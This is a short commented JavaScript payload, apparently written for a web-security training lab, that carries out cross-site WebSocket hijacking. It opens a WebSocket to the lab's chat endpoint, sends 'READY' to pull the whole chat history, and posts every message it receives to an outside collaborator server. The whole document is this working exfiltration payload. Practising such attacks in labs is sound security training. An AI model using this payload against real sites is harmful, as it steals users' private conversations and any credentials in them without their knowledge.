
<script>

    // Creation of new WebSocket(that WebSocket that is used by lab)
    var ws = new WebSocket('wss://0a0800a60421916381b3c62d009b00b3.web-security-academy.net/chat');

    // Sending the "READY" command as soon as WebSocket connection is open(onopen is a event). After sending the "READY" command the WebSocket will reply with the entire chat history
    ws.onopen = function() {
        ws.send("READY");
    };

    // Once we receive messages from the WebSocket then we do a GET request with those messages to our collaborator server
    ws.onmessage = function(event) {
        fetch('https://3qubo9igtrsj80be17hrkxoyup0go7cw.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
